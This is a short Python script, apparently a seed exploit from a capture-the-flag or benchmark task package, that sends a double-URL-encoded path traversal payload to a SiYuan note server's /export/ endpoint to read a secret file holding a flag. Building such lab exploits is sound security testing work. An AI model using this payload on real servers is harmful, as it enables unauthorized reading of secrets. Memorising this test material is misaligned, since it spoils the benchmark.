#!/usr/bin/env python3
"""[GIVEN] CVE-2026-30869 seed exploit for siyuan-cve-2026-41894.

Double-URL-encoded traversal against /export/: Go's HTTP server decodes %25 once,
the redundant url.PathUnescape() in serveExport() decodes again, so the path
escapes the export directory. On v0 (3.5.9) there is NO IsSensitivePath check,
so workspace/conf/pcb_secret.txt (which carries the flag) is readable. On v1
(3.5.10) IsSensitivePath blocks the conf directory (CVE-2026-30869 fix).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import sy_util as u  # noqa: E402

PAYLOAD = "%252e%252e/%252e%252e/conf/pcb_secret.txt"


def candidate(*, version="v1", flag=None):
    status, body = u.get_export(version, PAYLOAD)
    return {"ok": flag in body if flag else body.strip() != "", "status": status, "body": body.strip()[:100]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
